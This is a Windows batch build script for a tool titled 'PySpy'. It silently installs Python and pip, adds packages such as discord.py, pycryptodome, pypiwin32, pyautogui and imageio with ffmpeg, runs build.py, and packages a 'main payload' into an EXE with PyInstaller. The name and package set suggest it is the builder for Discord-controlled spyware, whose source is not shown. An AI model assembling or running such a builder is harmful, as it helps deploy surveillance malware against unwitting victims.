@echo off
title PySpy
echo Please setup config.json before continuing. If you already have, continue.
pause

echo Installing Python
:: Check if Python is installed
python --version >nul 2>&1
if %errorlevel% neq 0 (
    :: Download Python installer
    curl -o python_installer.exe https://www.python.org/ftp/python/3.12.4/python-3.12.4-amd64.exe
    :: Install Python silently (modify the installer version and path as needed)
    python_installer.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
    :: Remove installer after installation
    del python_installer.exe
) else (
    echo Python is already installed.
)

echo Installing pip
:: Check if pip is installed
pip --version >nul 2>&1
if %errorlevel% neq 0 (
    python -m ensurepip
    python -m pip install --upgrade pip
) else (
    echo pip is already installed.
)

echo Installing Packages
pip install discord.py
pip install pillow
pip install psutil
pip install numpy
pip install requests
pip install imageio
pip install imageio[ffmpeg]
pip install pycryptodome
pip install pypiwin32
pip install pyautogui
pip install pyinstaller
echo Installed Packages

echo Compiling scripts
python build.py
echo Compiled scripts

echo Packaging main payload
pyinstaller script.spec
echo Packaged main payload

echo Build completed. Final EXE is in the dist folder.
echo Run rebuild.bat if there was an error or you would like to rebuild the EXE.
pause
exit /b 0